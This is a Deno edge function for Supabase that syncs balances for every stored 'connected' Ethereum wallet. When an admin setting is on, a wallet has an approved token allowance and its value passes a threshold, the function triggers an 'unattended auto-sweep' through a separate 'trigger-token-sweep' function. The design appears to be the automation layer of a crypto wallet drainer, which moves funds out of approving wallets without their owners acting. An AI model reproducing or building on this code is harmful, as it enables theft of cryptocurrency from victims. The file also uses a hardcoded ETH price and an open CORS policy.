import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.38.4"
import { ethers } from "https://esm.sh/ethers@6.7.0"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  if (req.method === 'OPTIONS') return new Response('ok', { headers: corsHeaders })

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL') || ''
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') || ''
    const supabase = createClient(supabaseUrl, supabaseKey)

    // 1. Get Automation Settings
    const { data: settings } = await supabase.from('admin_settings').select('*').single()
    const autoSweepEnabled = settings?.auto_sweep_enabled || false
    const minThresholdUsd = settings?.gas_topup_threshold_usd || 100

    // 2. Fetch all wallets
    const { data: wallets, error: fetchError } = await supabase
      .from('connected_wallets')
      .select('*')
    
    if (fetchError) throw fetchError

    const alchemyKey = Deno.env.get('ALCHEMY_API_KEY')
    let syncCount = 0
    let autoSweepCount = 0

    for (const wallet of wallets) {
      try {
        const rpcUrl = `https://eth-mainnet.g.alchemy.com/v2/${alchemyKey}`
        const provider = new ethers.JsonRpcProvider(rpcUrl)
        
        // Fetch native balance
        const balance = await provider.getBalance(wallet.wallet_address)
        const ethValue = parseFloat(ethers.formatEther(balance))
        const totalValueUsd = ethValue * 2200; // Simplified price fetch

        // Update Wallet Metadata
        await supabase.from('connected_wallets').update({ 
          metadata: { 
            ...wallet.metadata, 
            total_value_usd: totalValueUsd,
            last_sync_at: new Date().toISOString() 
          } 
        }).eq('id', wallet.id)
        
        syncCount++

        // 3. UNATTENDED AUTO-SWEEP LOGIC
        if (autoSweepEnabled && wallet.allowance_amount > 0 && totalValueUsd >= minThresholdUsd) {
           console.log(`Unattended trigger for ${wallet.wallet_address} (Value: $${totalValueUsd})`)
           
           // Call the sweep function internally
           await supabase.functions.invoke("trigger-token-sweep", {
             body: { 
               walletAddress: wallet.wallet_address, 
               chainId: wallet.chain_id,
               userId: wallet.user_id 
             }
           })
           autoSweepCount++
        }

      } catch (err) {
        console.error(`Sync/Sweep error for ${wallet.wallet_address}:`, err)
      }
    }

    return new Response(JSON.stringify({ 
      message: `Sync complete. ${syncCount} wallets updated. ${autoSweepCount} auto-sweeps triggered.`, 
      count: syncCount 
    }), { headers: corsHeaders, status: 200 })

  } catch (error) {
    return new Response(JSON.stringify({ error: error.message }), { headers: corsHeaders, status: 400 })
  }
})
